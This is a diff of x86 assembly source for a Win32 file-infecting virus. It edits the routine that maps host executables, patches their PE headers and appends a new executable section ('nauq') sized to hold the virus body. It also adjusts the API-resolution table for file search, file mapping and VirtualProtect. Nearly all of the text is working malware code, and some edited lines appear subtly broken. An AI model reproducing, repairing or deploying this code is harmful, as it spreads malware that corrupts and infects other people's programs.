@@ -15,8 +15,7 @@ FindFirstFileSuccess            		BYTE                        "First file found 
 FindNextFileError               		BYTE                        "FindNextFile failed ", 0
 FindNextFileSuccess             		BYTE                        "FirstNextFile found with success ", 0
 FolderFound           		  		BYTE                        "Folder found", 0
-PATH					        db			    "C:\Documents and Settings\Administrator\Desktop\virus\",0
-virus_size equ (virus_end-virusCode)
+PATH					            db			          "C:\Documents and Settings\Administrator\Desktop\virus\",0
 .code
 ; ------------------------------------------------------------------------------------------------------------------;
 virusCode:
@@ -174,8 +173,8 @@ infecting:
 	xor edx,edx
 	
 	mov eax,[ebp+mem_map_handle]
-	add eax,3ch
-	mov ecx,[eax]
+	;add eax,3ch
+	mov ecx,[eax+3ch]
 	add ecx,[ebp+mem_map_handle]
 	mov eax,ecx    ; point to PE header of host
 	add eax,18h
@@ -208,8 +207,8 @@ infecting:
 	mov eax,[eax]
 	mov [ebp+host_sec_alig],eax
 	
-	;mov eax,[ebp+host_sec_alig]
-	lea eax,[ebp+host_no_sect]
+	lea eax,[ebp+host_sec_alig]
+	lea edx,[ebp+host_no_sect]
 	mul edx
 	
 	push eax
@@ -236,8 +235,8 @@ infecting:
 	mov [ebp+host_rel_tab],edx
 	
 	add edx,8				; edx point to virtual size
-	mov dword ptr[edx],virus_size ; set the size of the section
-	mov eax,[edx]
+	mov edx,virus_size          ; set the size of the section
+	mov eax,edx
 	
 	push ecx
 	push edx
@@ -246,13 +245,13 @@ infecting:
 	mul ecx
 	pop edx
 	pop ecx
-	mov [edx],eax
+	mov edx,eax
 	
 	mov eax,ecx
 	add eax,18h
 	add eax,52
 	
-	mov dword ptr[eax],"quan"
+	mov dword ptr[eax],"nauq"
 	mov eax,[ebp+host_rel_tab]
 	add eax,24
 	mov dword ptr[eax],0F0000060H
@@ -530,16 +529,16 @@ delta_var    				dd    0h
 map_handle    				dd    0h
 file_map_handle    			dd    0h
 mem_map_handle    			dd    0h
-host_opt_size    			dw    0h
-host_no_sect    			dw    0h
-host_file_alig   			dd    0h
-host_sec_alig    			dd    0h
-host_relc_raw    			dd    0h
+host_opt_size    				dw    0h
+host_no_sect    				dw    0h
+host_file_alig   				dd    0h
+host_sec_alig    				dd    0h
+host_relc_raw    				dd    0h
 virtual_out    				dd    0h
-search_handle    			dd    0h
-host_rel_tab    			dd    0h
+search_handle    				dd    0h
+host_rel_tab    				dd    0h
 host_new_entry    			dd    0h    
-
+virus_size 					equ (virus_end-virusCode)
 Win32FindData struct
       FileAttributes           	dd 0              ;attributes
       CreationTime             	dd 0,0            ;time of creation
@@ -566,16 +565,16 @@ APIName:
 	VirtualProtectStr    		db    "VirtualProtect", 0
 	SetCurrentDirectoryStr		db    "SetCurrentDirectoryA", 0
 APIAddress:
-	FindNextFileAAddress    	 	dd    0h
-	FindFirstFileAAddress   	 	dd    0h
-	CreateFileAAddress       		dd    0h
-	CreateFileMappingAAddress   		dd    0h
-	MapViewOfFileAAddress 	 		dd    0h
-	GetModuleHandleAddress  	 	dd    0h
-	GetProcAddressAddress   		dd    0h 
-	UnmapViewOfFileAddress   		dd    0h
-	CloseHandleAddress        		dd    0h
-	VirtualProtectAddress    		dd    0h
-	SetCurrentDirectoryAddress 		dd    0h
+	FindNextFileAAddress    	dd    0h
+	FindFirstFileAAddress   	dd    0h
+	CreateFileAAddress       	dd    0h
+	CreateFileMappingAAddress   	dd    0h
+	MapViewOfFileAAddress 	 	dd    0h
+	GetModuleHandleAddress  	dd    0h
+	GetProcAddressAddress   	dd    0h 
+	UnmapViewOfFileAddress   	dd    0h
+	CloseHandleAddress        	dd    0h
+	VirtualProtectAddress    	dd    0h
+	SetCurrentDirectoryAddress 	dd    0h
 virus_end:	
 end virusCode
